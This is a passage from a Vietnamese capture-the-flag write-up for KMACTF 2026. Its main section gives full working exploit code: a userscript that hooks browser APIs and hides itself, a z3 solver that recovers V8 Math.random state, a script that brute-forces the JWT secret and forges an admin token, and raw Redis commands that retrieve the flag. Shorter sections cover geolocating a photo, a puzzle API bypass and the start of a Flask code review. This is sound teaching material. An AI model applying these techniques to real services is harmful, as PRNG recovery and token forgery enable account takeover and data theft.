          }: game=${message.gameId} score=${saved.score} reason=${message.reason}`,
        );
        return {
          type: "score_saved",
          gameId: message.gameId,
          score: saved.score,
          duplicate: !saved.created,
          profile: saved.profile,
        };
      } catch (error) {
        console.error(
          `[connection ${context.id}] Redis score save failed: ${
            errorText(error)
          }`,
        );
        return {
          type: "score_error",
          gameId: message.gameId,
          message: "Redis is unavailable; the final score was not saved.",
          retryable: true,
        };
      }
    }

    case "get_leaderboard": {
      try {
        return {
          type: "leaderboard",
          entries: await context.store.getLeaderboard(message.limit),
        };
      } catch (error) {
        console.error(
          `[connection ${context.id}] Redis leaderboard query failed: ${
            errorText(error)
          }`,
        );
        return {
          type: "protocol_error",
          code: "redis_unavailable",
          message: "Leaderboard is temporarily unavailable.",
        };
      }
    }
  }
}
```
Ở đây ta thấy có 4 case riêng biệt hoạt động theo đúng flow
```bash!
start_game -> get_random -> submit_score -> get_leaderboard
```
### xorshift128+
Trong đó 
- case `start_game` sẽ xác định user , tạo gameId random uuid
- case `get_random` chính là cách chơi trò `k-B-B` của bot , điểm đặc biệt là nó sử dụng `Math.random()` Đây có vẻ là điểm chính của cách vận hành trò chơi, ta sẽ cần tìm lỗ hổng liên quan đến hàm này để hack điểm
Mình có tìm cách crack hàm này qua write up https://ctftime.org/writeup/39709 và biết thuật toán hàm này dùng là `xorshift128+` để sinh số và có thể bị crack qua [V8 random Buster](https://github.com/d0nutptr/v8_rand_buster)
- Nhưng vấn đề ở đây là việc gửi request khá khó khăn vì browse sử dụng http3

Tổng quan về flow file `webtransport.ts` như sau
```bash!
                QUIC
                 │
                 ▼
       acceptConnection()
                 │
                 ▼
           WebTransport
                 │
          check pathname
            /         \
           /           \
          ▼             ▼
"/admin/redis-cmd"      "/"
          │             │
          ▼             ▼
 serveAdminRedis     bidirectional stream
 Streams                 │
                         ▼
                  authenticate PSK
                         │
                    PSK correct
                         │
                         ▼
                 handleClientMessage
                         │
          ┌──────────────┼───────────────┐
          ▼              ▼               ▼
 identify_player    start_game       get_random
          │              │               │
          ▼              ▼               ▼
        JWT          game UUID       Math.random()
                                          │
                    ┌─────────────────────┘
                    ▼
               submit_score
                    │
                    ▼
                  Redis

               get_leaderboard
                    │
                    ▼
                  Redis
```
Vậy nên mỗi lần muốn tự động gửi request bằng console kiểu
```
{"type":"get_random","requestId":"1"}\n
```
### Bypass WebTransport
Ta đều phải kèm theo `preshared_key` để auth, ta cần phải crack để cho mọi message sẽ đi thẳng đến `handleClientMessage()` 
Ta sẽ cần thiết kế một Hook chạy song song với front-end và dùng lại `preshared_key` đã có sẵn để xác thực một stream.
Luồng flow sau khi chèn hook vào như sau
- ![mermaid-diagram](/research/kmactf-2026-ii/ry9Ig2UKzx.png)

```typescript!
async function handleGameStream(
  transport: WebTransport,
  stream: WebTransportBidirectionalStream,
  context: ConnectionContext,
  streamId: number,
  presharedKey: string,
): Promise<void> {
  const reader = stream.readable.getReader();   //data read từ server
  const writer = stream.writable.getWriter();   //Hook chạy tại đây
  
  ....
  
 async function sendMessage(
  writer: WritableStreamDefaultWriter<Uint8Array>,
  message: ServerMessage,
): Promise<void> {
  await writer.write(encodeServerMessage(message));
}
```
Ta sử dụng `getWriter()` vì trong WebTransport bidirectional stream ko có send trực tiếp như websocket `socket.send(data)` sau khi hook chạy xong sẽ front-end phải lấy dữ liệu để ghi qua `await writer.write(bytes);`
- Điểm mấu chốt là ta sẽ chặn front-end lấy writer bằng tamper với
```javascript!
const o = WritableStream.prototype.getWriter;

function hookedGetWriter() {
    const r = o.apply(this, arguments);

    window.__writers.push(r);

    return r;
}

WritableStream.prototype.getWriter = hookedGetWriter;
```
Hook sẽ gọi writer gốc lưu writer vào `window.__writers` và trả lại cho front-end như vậy sau đó front-end sẽ thực hiện các luồng còn lại như việc tự gửi `PSK` hay `authStream` từ đó message của ta sẽ đi thẳng đến `handleClientMessage()`
Ngoài ra để nhận lại luồng response, ta cũng cần phải dùng hook để chặn hàm `Json.parse()`
```typescript!
const origParse = JSON.parse;

function hookedParse() {
  try {
    window.__s2c.push(String(arguments[0]).slice(0, 2000));
  } catch (e) {}

  return origParse.apply(this, arguments);
}

JSON.parse = hookedParse;
```
Ta sẽ lưu chuỗi json vào `window.__s2c`
### FULL TamperMonKey Script
```javascript!
// ==UserScript==
// @name         KBB Hook
// @namespace    http://tampermonkey.net/
// @version      2026-09-15
// @description  try to take over the world!
// @author       You
// @match        https://chall.kcsc.vn:9007/*
// @run-at       document-start  -> tránh miss writer
// @icon         https://www.google.com/s2/favicons?sz=64&domain=kcsc.vn
// @grant        none
// ==/UserScript==

(function () {
    if (window.__hookInstalled) return;
    window.__hookInstalled = true;
    window.__s2c = [];
    window.__writers = [];
    const origToString = Function.prototype.toString; //anti-detect
    const hookMap = new Map();
    function fakeToString() {
      if (hookMap.has(this)) return origToString.call(hookMap.get(this));
      return origToString.call(this);
    }
    Object.defineProperty(fakeToString, 'name', { value: 'toString', configurable: true });
    Object.defineProperty(fakeToString, 'length', { value: 0, configurable: true });
    hookMap.set(fakeToString, origToString);
    Function.prototype.toString = fakeToString;
    //get response
    const origParse = JSON.parse;
    function hookedParse() {           
      try { window.__s2c.push(String(arguments[0]).slice(0, 2000)); } catch (e) {}
      return origParse.apply(this, arguments);
    }
    Object.defineProperty(hookedParse, 'name', { value: 'parse', configurable: true });
    Object.defineProperty(hookedParse, 'length', { value: 2, configurable: true });
    hookMap.set(hookedParse, origParse);
    JSON.parse = hookedParse;
    //getwriter
    const o = WritableStream.prototype.getWriter;
    function hookedGetWriter() {
      const r = o.apply(this, arguments);
      try { window.__writers.push(r); } catch (e) {}
      return r;
    }
    Object.defineProperty(hookedGetWriter, 'name', { value: o.name, configurable: true });
    Object.defineProperty(hookedGetWriter, 'length', { value: o.length, configurable: true });
    hookMap.set(hookedGetWriter, o);
    WritableStream.prototype.getWriter = hookedGetWriter;
  })();
```
Sau khi enable extension này , ta có thể gửi dữ liệu qua console khá thoải mái
![image](/research/kmactf-2026-ii/ry3yH3ItMg.png)

Tiếp theo ta sẽ focus sang `admin_redis.ts` vì nơi đây chứa endpoint `/admin/redis-cmd` require admin role
```typescript!
async function pumpWebTransportToRedis(
  reader: ReadableStreamDefaultReader<Uint8Array>,
  redis: Deno.TcpConn,
): Promise<void> {
  while (true) {
    const { done, value } = await reader.read();     //source
    if (done) {
      try {
        redis.closeWrite();
      } catch {
        // Redis may already have closed the connection.
      }
      return;
    }
    if (value === undefined || value.length === 0) continue;
    await writeAll(redis, value);                      //sink
  }
}
...
async function writeAll(
  connection: Deno.TcpConn,
  bytes: Uint8Array,
): Promise<void> {
  let offset = 0;
  while (offset < bytes.length) {
    offset += await connection.write(bytes.subarray(offset));
  }
}
```
Đây là một hàm hoạt động như một TCP tunnel từ WebTransport -> Redis. Điểm nguy hiểm là toàn bộ data đều được đi thẳng vào redis qua `connection.write`. Nhưng để làm được vậy cần phải đi qua hàm Auth
```typescript!
async function handleAdminRedisStream(
  stream: WebTransportBidirectionalStream,
  redisUrl: string,
  connectionId: number,
): Promise<void> {
  const reader = stream.readable.getReader();
  const writer = stream.writable.getWriter();
  let redis: Deno.TcpConn | undefined;

  try {
    const auth = await readAuthLine(reader);
    const claims = await verifyJwt(auth.token);     //auth token
    if (claims.admin !== true) {
      await sendControl(writer, {
        type: "admin_error",
        code: "admin_required",
        message: "JWT admin claim must be true.",
      });
      return;
    }

    redis = await connectRawRedis(redisUrl);
    await sendControl(writer, { type: "admin_ready" });
    console.log(
      `[connection ${connectionId}] admin Redis stream authenticated`,
    );

    if (auth.remainder.length !== 0) {
      await writeAll(redis, auth.remainder);
    }

    await Promise.allSettled([
      pumpWebTransportToRedis(reader, redis),
      pumpRedisToWebTransport(redis, writer),
    ]);
  } catch (error) {
    console.warn(
      `[connection ${connectionId}] admin Redis stream failed: ${
        errorText(error)
      }`,
    );
    try {
      await sendControl(writer, {
        type: "admin_error",
        code: "admin_stream_failed",
        message: errorText(error),
      });
    } catch {
      // The stream may already be closed or may already be in raw RESP mode.
    }
  } finally {
    try {
      redis?.close();
    } catch {
      // Already closed.
    }
    try {
      await writer.close();
    } catch {
      // The peer may already have reset the stream.
    }
    reader.releaseLock();
    writer.releaseLock();
  }
}

async function readAuthLine(
  reader: ReadableStreamDefaultReader<Uint8Array>,
): Promise<{ readonly token: string; readonly remainder: Uint8Array }> {
  let pending = new Uint8Array(0);
  while (true) {
    const newline = pending.indexOf(0x0a);
    if (newline >= 0) {
      const lineEnd = newline > 0 && pending[newline - 1] === 0x0d
        ? newline - 1
        : newline;
      const line = new TextDecoder("utf-8", { fatal: true }).decode(
        pending.subarray(0, lineEnd),
      );
      let value: unknown;
      try {
        value = JSON.parse(line);
      } catch {
        throw new Error("Admin stream must start with a JSON auth line.");
      }
      if (value === null || typeof value !== "object" || Array.isArray(value)) {
        throw new Error("Admin auth message must be a JSON object.");
      }
      const object = value as Record<string, unknown>;
      if (object.type !== "auth" || typeof object.token !== "string") {
        throw new Error(
          'Admin auth line must be {"type":"auth","token":"..."}.',
        );
      }
      return {
        token: object.token,
        remainder: pending.slice(newline + 1),
      };
    }

    if (pending.length > MAX_AUTH_LINE_BYTES) {
      throw new Error("Admin auth line is too large.");
    }
    const { done, value } = await reader.read();
    if (done) throw new Error("Admin stream ended before authentication.");
    if (value === undefined || value.length === 0) continue;
    const combined = new Uint8Array(pending.length + value.length);
    combined.set(pending);
    combined.set(value, pending.length);
    pending = combined;
  }
}
```
Tức là ta sẽ cần role Admin, cái được config qua hàm `verifyJwt` bên `jwt.ts` và chỉ khi có `claims.admin !== true` ta mới có thể gửi được writer đến redis.
Khả năng cao là bài này sẽ giấu flag nằm trong redis, ta sẽ cần phải forge token để lên admin. Logic giờ chủ yếu nằm ở cách cấu tạo jwt.
- `jwt.ts`
Ngay dòng đầu ta đã thấy secret được cấu tạo từ hàm `Match.random()` -> hàm mà lúc nãy ta cũng có nhắc tới
```typescript!
export const JWT_Secret = `${Math.random()}-${Math.random()}-${Math.random()}`;
const keyPromise = crypto.subtle.importKey(
  "raw",
  textEncoder.encode(JWT_Secret),
  { name: "HMAC", hash: "SHA-256" },
  false,
  ["sign", "verify"],
);
export async function signJwt(claims: JwtClaims): Promise<string> {
  const header = base64UrlEncode(
    textEncoder.encode(JSON.stringify({ alg: "HS256", typ: "JWT" })),
  );
  const payload = base64UrlEncode(textEncoder.encode(JSON.stringify(claims)));
  const signingInput = `${header}.${payload}`;
  const signature = await crypto.subtle.sign(
    "HMAC",
    await keyPromise,
    textEncoder.encode(signingInput),
  );
  return `${signingInput}.${base64UrlEncode(new Uint8Array(signature))}`;
}
```
### Cracking Math.random()
Chữ kí được tạo bởi `HMAC-SHA256(JWT_Secret, header + "." + payload)`
`JWT_Secret` ta có thể crack được, bằng việc dự đoán một bộ PRNG, sau đó có thể sử dụng tool để crack. Bộ PRNG có thể lấy được thông qua `get_random` ở trên vì cũng sử dụng `Math.random()`.
Ta cần hiểu hơn về mô hình `xorshift128+` mà [V8](https://github.com/v8/v8/blob/master/src/base/utils/random-number-generator.h) sử dụng cho `Math.random()` cụ thể
```bash!
state = 128 bit
output = (state0 + state1) >>> 11
value  = output / 2^53
```
Tức là nó sẽ ko sinh số ngẫu nhiên, mà state hiện tại có thể tính được value tương lai, ta cần tìm về 3 out-put đầu tiện - cái là `JWT secret`. Mà để tìm được nó tất nhiên ta cần phải tìm được `state 128-bit`
Ý tưởng là ta sẽ đi thu thập tầm 40 mẫu qua hàm `get_random` , sau đó sẽ sử dụng `z3` để tính lại state ban đầu từ đó lấy dc secret
![mermaid-diagram (1)](/research/kmactf-2026-ii/BkT4o1PtMe.png)
> m-0 đến m-39 chính là 40 mẫu ta sẽ lấy

Một state 128 bit gồm 2 số 64 bit $Sn​=(an​,bn​)$
```javascript!
(async () => {
    const w = window.__writers[0];
    const enc = new TextEncoder();
    for (let i = 0; i < 40; i++) {
      await w.write(enc.encode(JSON.stringify({type:'get_random',requestId:'m-'+i})+'\n'));
      await new Promise(r => setTimeout(r, 60));
    }
    console.log('xong');
  })();
```
Ta tiến hành crawl 40 mẫu trong devtool, sau đó lấy result và jwt_token qua
```javascript!
copy(window.__s2c.filter(s => s.includes('"random"')).join('\n'));  //40 records
copy(JSON.parse(window.__s2c.find(s => s.includes('player_identified'))).token);  //token
```
```
{"type":"random","requestId":"m-0","value":0.41169942255107705}
{"type":"random","requestId":"m-1","value":0.8142043205723001}
{"type":"random","requestId":"m-2","value":0.7064332496166699}
{"type":"random","requestId":"m-3","value":0.008189564959206308}
{"type":"random","requestId":"m-4","value":0.4113256943966913}
{"type":"random","requestId":"m-5","value":0.204062996783562}
{"type":"random","requestId":"m-6","value":0.7840722275137064}
{"type":"random","requestId":"m-7","value":0.6532702282285905}
{"type":"random","requestId":"m-8","value":0.3088896591739144}
{"type":"random","requestId":"m-9","value":0.5356449787028453}
{"type":"random","requestId":"m-10","value":0.4929181611759478}
{"type":"random","requestId":"m-11","value":0.20327631130422275}
{"type":"random","requestId":"m-12","value":0.41760797000786354}
{"type":"random","requestId":"m-13","value":0.5569052243438983}
{"type":"random","requestId":"m-14","value":0.7218384066454677}
{"type":"random","requestId":"m-15","value":0.730448124386849}
{"type":"random","requestId":"m-16","value":0.6149112438582969}
{"type":"random","requestId":"m-17","value":0.9206973486473898}
{"type":"random","requestId":"m-18","value":0.6706783164583229}
{"type":"random","requestId":"m-19","value":0.8863072296255655}
{"type":"random","requestId":"m-20","value":0.7647949890730736}
{"type":"random","requestId":"m-21","value":0.9633597775353636}
{"type":"random","requestId":"m-22","value":0.0936341241252201}
{"type":"random","requestId":"m-23","value":0.7138656293571812}
{"type":"random","requestId":"m-24","value":0.645807030261356}
{"type":"random","requestId":"m-25","value":0.050735301162247115}
{"type":"random","requestId":"m-26","value":0.42349135431308293}
{"type":"random","requestId":"m-27","value":0.8166189296517914}
{"type":"random","requestId":"m-28","value":0.42277616252263206}
{"type":"random","requestId":"m-29","value":0.4268810138192298}
{"type":"random","requestId":"m-30","value":0.5032494730989011}
{"type":"random","requestId":"m-31","value":0.5649319586762844}
{"type":"random","requestId":"m-32","value":0.36796092562475025}
{"type":"random","requestId":"m-33","value":0.03941160982212366}
{"type":"random","requestId":"m-34","value":0.5694333309899462}
{"type":"random","requestId":"m-35","value":0.9573568836594556}
{"type":"random","requestId":"m-36","value":0.3838169109593703}
{"type":"random","requestId":"m-37","value":0.047699011700941485}
{"type":"random","requestId":"m-38","value":0.022760556040699487}
{"type":"random","requestId":"m-39","value":0.6648882736507347}
```
Ta sẽ lưu lại thành `randoms.txt`
- Nhưng vấn đề tiếp theo xảy ra đó là tool `v8_rand_buster` mà ta đã đề cập trước đó chỉ dùng được cho số nguyên 
- Mình cũng có thư thêm tool `js-randomness-predictor` nhưng vì nó bị chỗ đảo mẫu, và việc tool tin có cache 64 số trong khi đó với challenge này đã có rất nhiều các số quá khứ được tạo ra do các user khác cũng chơi
- Đoạn này do ko tìm được tool phù hợp nên mình đã sử dụng AI để hỗ trợ việc tìm lại state ban đầu
```python!
import json, sys
from pathlib import Path
from z3 import BitVecs, Solver, LShR, sat

BASE = Path(__file__).parent
MSK = (1 << 64) - 1            # tạo mask 64-bit

def step_sym(a, b):  # mô phỏng V8 xorshift128+ bằng symbolic expression (a,b) -> là state hiện tại
    t = a ^ (a << 23)
    t = t ^ LShR(t, 17)
    t = t ^ b ^ LShR(b, 26)
    return (b, t), (b + t)  # ((s0', s1') -> trả về state mới

def solve(ks):  # ks = 3 outputs liên tiếp (int 53-bit) -> (s0, s1) hoặc None
    s0, s1 = BitVecs('s0 s1', 64)          #tạo state chưa biết
    a, b = s0, s1
    s = Solver()
    for k in ks:
        (a, b), out = step_sym(a, b)
        s.add(LShR(out, 11) == k)  # moi double lo 53 bit cao cua output
    if s.check() != sat:           #check solution
        return None
    m = s.model()
    return m[s0].as_long(), m[s1].as_long()   #convert symbol -> number
 
def step_num(a, b):
    t = (a ^ ((a << 23) & MSK)) & MSK
    t = (t ^ (t >> 17)) & MSK
    t = (t ^ b ^ (b >> 26)) & MSK
    return b, t, (b + t) & MSK

vals = [int(json.loads(l)['value'] * 2**53) for l in open(BASE / 'randoms.txt') if l.strip()]
for i in range(len(vals) - 5):         #6 output để loại bớt nghiệm giả vì ta chỉ cần 3
    st = solve(vals[i:i + 3])
    if not st:
        continue
    a, b = st
    ok = True
    for j in range(6):  # verify
        a, b, o = step_num(a, b)
        ok &= (o >> 11) == vals[i + j]
    if ok:
        open(BASE / 'state.txt', 'w').write(f'{st[0]} {st[1]} {i}\n') #file có dạng state0 state1 window_index
        print(f'OK window {i}: s0={st[0]:#x} s1={st[1]:#x}')
        break
else:
    print('FAIL: khong co cua so lien tiep, thu thap mau moi')
    sys.exit(1)
```
output
```
OK window 1: s0=0xaca6da0753582eb3 s1=0xbcbe481c503ac884
```
### Forge admin token
Đây là ouput dc sinh ra tại một thời điểm ta giả sử nó là state trước khi sinh `m-1`, khi đó vị trí ta đang đứng sẽ là
```bash!
 quá khứ ◄─────────────────────────────────► hiện tại
  [r0 r1 r2]=secret ... request người khác ... m0 [m1 m2 m3 ... m39]
                                                      ▲
                                                state.txt = state
                                                ngay TRƯỚC m1
```
- Ta sẽ cần phải `unstep` về `m0` ,.... cho tới khi phủ toàn bộ lịch sử của `RNG`
- Tại mỗi `unstep` ta sẽ lấy bộ 3 liên tiếp mới nhất làm secret candidate `("0.xxx-0.yyy-0.zzz")` phục vụ cho việc Dò secret bằng HMAC rồi thử kí với `HMAC-SHA256(candidate, header.payload)` cho tới khi tìm đúng chữ kí thật, từ đó ta sẽ có token admin

```javascript!
//require state.txt && jwt.txt
const crypto = require('crypto'), fs = require('fs'), path = require('path');
const DIR = __dirname, M = (1n << 64n) - 1n;

function unstep(ns0, ns1) {                         //unstep
  const ps1 = ns0;
  const u = ns1 ^ ps1 ^ (ps1 >> 26n);
  let v = u;
  for (let i = 0; i < 6; i++) v = u ^ (v >> 17n);
  let p0 = v;
  for (let i = 0; i < 5; i++) p0 = (v ^ ((p0 << 23n) & M)) & M;
  return [p0 & M, ps1 & M, (ps1 + ns1) & M];
}
const dbl = o => Number(o >> 11n) / 2 ** 53; // output 64-bit

const [s0s, s1s] = fs.readFileSync(path.join(DIR, 'state.txt'), 'utf8').trim().split(' '); //lấy state
let s0 = BigInt(s0s), s1 = BigInt(s1s);
const t = fs.readFileSync(path.join(DIR, 'jwt.txt'), 'utf8').trim().split('.');   //lấy token thường
const input = t[0] + '.' + t[1]; // header.payload
const sig = Buffer.from(t[2].replace(/-/g, '+').replace(/_/g, '/'), 'base64');

// Trace về quá khứ mỗi bộ 3 outputs liên tiếp là 1 secret candidate
const LIMIT = parseInt(process.argv[2] || '20000000', 10), hist = [];
for (let i = 1; i <= LIMIT; i++) {
  const r = unstep(s0, s1);
  s0 = r[0]; s1 = r[1]; hist.push(dbl(r[2]));
  if (hist.length < 3) continue;
  const n = hist.length;
  const secret = `${hist[n - 1]}-${hist[n - 2]}-${hist[n - 3]}`; // sort lại
  if (!crypto.createHmac('sha256', secret).update(input).digest().equals(sig)) continue;
  // found
  console.log(`FOUND sau ${i} buoc: ${secret}`);
  fs.writeFileSync(path.join(DIR, 'jwt_secret.txt'), secret);
  const b64u = s => Buffer.from(s).toString('base64').replaceAll('+', '-').replaceAll('/', '_').replace(/=+$/, '');
  const h = b64u('{"alg":"HS256","typ":"JWT"}'), p = b64u(JSON.stringify({ admin: true, iat: Math.floor(Date.now() / 1000) }));
  const admin = `${h}.${p}.${b64u(crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest())}`;
  fs.writeFileSync(path.join(DIR, 'admin_jwt.txt'), admin);
  console.log('ADMIN JWT:', admin);
  process.exit(0);
}
console.log('Not found, try again');
```
FOUND sau 5 buoc: 0.5786370446540843-0.893302133229787-0.7193538800985366
ADMIN JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzg5NDk0NjcwfQ.nzUHI9lF4Hl4k9JkIqg86pgcGmhrlfhUD3ALyIfDSas
Sau đó ta sẽ sử dụng console để thực hiện connect đến redis
```javascript!
var ADMIN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzg5NDk2NzI0fQ.7azwTJEEFLCz2W2g1pE4QZjtjNfYUUj9DrlYHNGAuKA';
var HASH = document.documentElement.outerHTML.match(/data-c1="([0-9a-f]+)"/)[1];
var wt = new WebTransport('https://chall.kcsc.vn:9007/admin/redis-cmd', {
    serverCertificateHashes: [{ algorithm: 'sha-256',
      value: Uint8Array.from(HASH.match(/../g).map(h => parseInt(h, 16))).buffer }]
  });
await wt.ready;
var st = await wt.createBidirectionalStream();
var w = st.writable.getWriter(), rd = st.readable.getReader();
var enc = new TextEncoder(), dec = new TextDecoder();
var buf = '';
async function waitFor(fn) {
    while (!fn(buf)) {
      const { done, value } = await rd.read();
      if (done) throw new Error('server ngat: ' + buf);
      buf += dec.decode(value, { stream: true });
    }
  }
await w.write(enc.encode(JSON.stringify({ type: 'auth', token: ADMIN }) + '\n'));
await waitFor(t => t.includes('admin_ready'));
console.log('auth OK');
buf = '';
await w.write(enc.encode('*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n'));  // Command Redis: KEYS *
await waitFor(t => t.includes('FLAG'));
console.log(buf); buf = '';
```
Lệnh này sẽ liệt kê tất cả các key có tròn redis và mình đã tìm thấy KEY flag
![image](/research/kmactf-2026-ii/BydMyGvtMe.png)
### FLAG
Final payload
```javascript
var ADMIN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzg5NDk2NzI0fQ.7azwTJEEFLCz2W2g1pE4QZjtjNfYUUj9DrlYHNGAuKA';
var HASH = document.documentElement.outerHTML.match(/data-c1="([0-9a-f]+)"/)[1];
var wt = new WebTransport('https://chall.kcsc.vn:9007/admin/redis-cmd', {
    serverCertificateHashes: [{ algorithm: 'sha-256',
      value: Uint8Array.from(HASH.match(/../g).map(h => parseInt(h, 16))).buffer }]
  });
await wt.ready;
var st = await wt.createBidirectionalStream();
var w = st.writable.getWriter(), rd = st.readable.getReader();
var enc = new TextEncoder(), dec = new TextDecoder();
var buf = '';
async function waitFor(fn) {
    while (!fn(buf)) {
      const { done, value } = await rd.read();
      if (done) throw new Error('server ngat: ' + buf);
      buf += dec.decode(value, { stream: true });
    }
  }
await w.write(enc.encode(JSON.stringify({ type: 'auth', token: ADMIN }) + '\n'));
await waitFor(t => t.includes('admin_ready'));
console.log('auth OK');
buf = '';
await w.write(enc.encode('*2\r\n$3\r\nGET\r\n$4\r\nFLAG\r\n'));
await waitFor(t => t.includes('}'));
console.log('FLAG:', buf);
```
![image](/research/kmactf-2026-ii/rk5y0ZvKGl.png)

### **References**
- https://github.com/v8/v8/blob/master/src/base/utils/random-number-generator.h
- https://github.com/d0nutptr/v8_rand_buster
- https://ctftime.org/writeup/39709

## Sanity Check
![image](/research/kmactf-2026-ii/rJ8pBGwFMx.png)

## Rainy Day
![image](/research/kmactf-2026-ii/H11JIMPtzx.png)
Chall yêu cầu ta tìm một khách sạn nơi author đang ở, tải file về ta nhận được một tấm ảnh như sau
![Rainy_Day (1)](/research/kmactf-2026-ii/S1RNIzvtfe.png)
Để ý ta thây có một tòa nhà mang kiến trúc khá độc đáo
![image](/research/kmactf-2026-ii/rJMwLfDFMl.png)
Đây sẽ là thông tin quan trọng cho việc recon. Sau khi search ảnh thì mình biết đây là kiến trúc `Morphosis Architects` và tòa đó tên là `세종 엠브릿지` nằm tại sejong
![image](/research/kmactf-2026-ii/SyAW_fvtfl.png)
Quanh đây chỉ có 1 khách sạn nên mình nghĩ đây là đáp án
```bash!
KMACTF{Best_Western_Plus_Hotel_Sejong}
```

## R U Ready?

![image](/research/kmactf-2026-ii/S1kia5PKMg.png)
![image](/research/kmactf-2026-ii/Syqh65wtGg.png)
Challenge cho ta một khối rubix 2x2 , ta cần giải khối này xong mới được sang khối 3x3 để solve , tất nhiên ta sẽ ko giải trực tiếp. Tiến hành xem source thì mình thấy web đang chạy một file javeScript `/assets/index-CO3YbkAX.js`, mở devtool để xem thì mình tìm được 2 api sau
```javascript!
async function Ge(e, t) {
    return We(`/api/stages/${e}/start`, {
        method: `POST`,
        body: JSON.stringify(e === 2 ? {
            stagePassToken: t
        } : {})
    })
}
async function Ke(e, t, n) {
    return We(`/api/stages/${e}/finish`, {
        method: `POST`,
        body: JSON.stringify({
            runId: t,
            moves: n
        })
    })
}
```
- `/api/stages/1/start` -> sẽ scramble một khối 2x2 và ta có 60s để giải , và để giải khối 3x3, ta cần api `/api/stages/2/start` và kèm theo tham số `stagePassToken`
- `/api/stages/${e}/finish` đây sẽ là nơi ra điền move để giải với một `runId` còn hạn

Tiến hành sử dụng burp suite để gửi request đến `/1/start` ta nhận được một scramble
```jsonld
{"runId":"2e7fc7f9-01ec-459e-be2d-96f1235f7f93","stage":1,"puzzle":"2x2x2","scramble":"U F U2 L2 F' R' F U L2 F U'","serverNow":1789533347959,"startsAt":1789533350959,"deadlineAt":1789533410959}
```
Để giải được khá đơn giản ta chỉ cần quay ngược lại scamble bằng cách đảo ngược lại move và reverse single quote những char k có kí tự 2
ví dụ
```javascript!
const s = "F U L' F2 R F' R U' F' L' U'";

const moves = s.split(/\s+/).reverse().map(m =>
  m.endsWith("2") ? m :              
  m.endsWith("'") ? m.slice(0, -1) : m + "'"
);

copy(JSON.stringify(moves));
```
```http!
POST /api/stages/1/finish HTTP/1.1
Content-Type: application/json

{"runId":"2e7fc7f9-01ec-459e-be2d-96f1235f7f93","moves":["U","F'","L2","U'","F'","R","F","L2","U2","F'","U'"]}
```
Ta nhận được một `stagePassToken`
```jsonld
{"ok":true,"stage":1,"elapsedMs":22529,"moveCount":11,"stagePassToken":"eyJ0eXAiOiJzdGFnZS1wYXNzIiwic3RhZ2UiOjEsIm5vbmNlIjoiZWUyOGM1OTljYjgyZWQ3OWM2NjBmOWMxYWM3NzI1ZTAiLCJpYXQiOjE3ODk1MzMzNzM0ODcsImV4cCI6MTc4OTUzMzk3MzQ4N30.gD30ywKBGeuCygUyYlE3uTPHNrXJ_2S3GOSzwWDHjPM"}
```
Tiếp tục start khối 3x3
![image](/research/kmactf-2026-ii/HyGV-jDKfg.png)

và ta có flag
![image](/research/kmactf-2026-ii/Sk6VfswKMx.png)

## KMAPurify
### Phân tích
![image](/research/kmactf-2026-ii/BytN9oDYzx.png)
```docker-compose
services:
  web:
    build:
      context: ./web
    environment:
      FLAG: KMA{REDACTED}
      DB_PATH: /data/challenge.db
    ports:
      - "1337:1337"
    volumes:
      - challenge-data:/data
    restart: unless-stopped

  bot:
    build:
      context: .
      dockerfile: bot/Dockerfile
    environment:
      WEBAPP_URL: http://web:1337
      DB_PATH: /data/challenge.db
      ADMIN_USER: admin
      BOT_INTERVAL: "120"
    depends_on:
      - web
    volumes:
      - challenge-data:/data
    restart: unless-stopped

volumes:
  challenge-data:
```
File docker compose cho ta biết là server gồm 2 service `web` và `bot` , flag nằm trong env. Bot có cred admin và tần suất của bot là 120
Tiếp theo ta sẽ read qua `app.py`
```python!
import os

from flask import Flask, jsonify, redirect, render_template, request, session, url_for

import db

app = Flask(__name__, static_folder="static")
app.secret_key = os.urandom(32).hex()
db.init_db()


def current_user():
    username = session.get("username")
    return db.get_user(username) if username else None


@app.get("/")
def home():
    return render_template("home.html", user=current_user())


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        if session.get("username"):
            user = current_user()
            return redirect(url_for("profile", id=user["profile_id"]))
        return render_template("login.html")

    username = request.form.get("username", "")
    password = request.form.get("password", "")
    user = db.get_user(username)
    if not user or user["password"] != password:
        return jsonify(error="Invalid credentials"), 403

    session["username"] = username
    return redirect(url_for("profile", id=user["profile_id"]))


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        if session.get("username"):
            user = current_user()
            return redirect(url_for("profile", id=user["profile_id"]))
        return render_template("register.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    if not username or not password:
        return jsonify(error="Missing username or password"), 400
    if db.get_user(username):
        return jsonify(error="User already exists"), 409

    db.create_user(username, password)
    session["username"] = username
    return redirect(url_for("profile"))


@app.post("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))


@app.route("/profile", methods=["GET", "POST"])
def profile():
    user = current_user()
    if request.method == "POST":
        if not user:
            return redirect(url_for("login"))
        bio = request.form.get("bio", "")
        if len(bio) > 200:
            return jsonify(error="Bio must contain at most 200 characters"), 400
        db.update_bio(user["username"], bio)
        return redirect(url_for("profile", id=user["profile_id"]))

    profile_id = request.args.get("id", "")
    target = db.get_user_by_id(profile_id) if profile_id else user
    if not target:
        return redirect(url_for("login")) if not profile_id else (jsonify(error="Invalid profile id"), 400)

    is_admin = bool(user and user["username"] == "admin")

    return render_template(
        "profile.html",
        username=target["username"],
        bio=user["bio"],
        is_owner=bool(user and user["username"] == target["username"]),
        users=db.list_users() if is_admin else [],
    )


@app.post("/reset-password")
def reset_password():
    user_id = request.form.get("user_id", "").strip()
    if not user_id:
        return jsonify(error="Missing user ID"), 400

    user = db.get_user_by_id(user_id)
    if not user:
        return jsonify(error="User not found"), 404

    new_password = request.form.get("new_password", "")
    if not new_password:
        return jsonify(error="Missing new password"), 400

    db.update_password(user["username"], new_password)
    return redirect(url_for("login"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, threaded=True)

```
server chạy flask và ta để ý app được nhập secret `app.secret_key = os.urandom(32).hex()`
